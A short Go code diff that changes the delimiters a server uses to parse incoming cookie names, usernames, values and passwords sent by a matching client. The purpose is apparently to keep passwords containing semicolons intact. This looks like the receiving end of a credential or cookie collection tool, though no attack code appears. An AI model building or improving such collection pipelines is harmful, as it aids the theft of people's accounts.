@@ -145,8 +145,13 @@ func processData(args string, writer *bufio.Writer) {
 			continue
 		}
 
+		// these should match the client constants
+		// variable names the same in server and client
+		const TERMINATOR = ";>|;}|;|£ "
+		const KEY_VAL_DELIM = "|<£||>"
+
 		// split the substrings by ";"
-		substrings := strings.Split(valueStr, ";")
+		substrings := strings.Split(valueStr, TERMINATOR)
 
 		for _, substring := range substrings {
 
@@ -158,12 +163,14 @@ func processData(args string, writer *bufio.Writer) {
 			}
 
 			// now split on ||| to pull out cookie name / username ||| value / password
-			parts := strings.Split(substring, "|||")
+			parts := strings.Split(substring, KEY_VAL_DELIM)
 
 			// handle errors
 			if len(parts) == 0 || len(parts) == 1 && parts[0] == "" {
 				continue
 			} else if len(parts) != 2 {
+				// handle errors where a semicolon is found within the body of a string, e.g. in a password - this will cause
+				// the function to chop up the password as substrings
 				log.Printf("Invalid format: expected 2 parts but found %d in substring '%s', parts: %v\n", len(parts), substring, parts)
 				continue
 			}
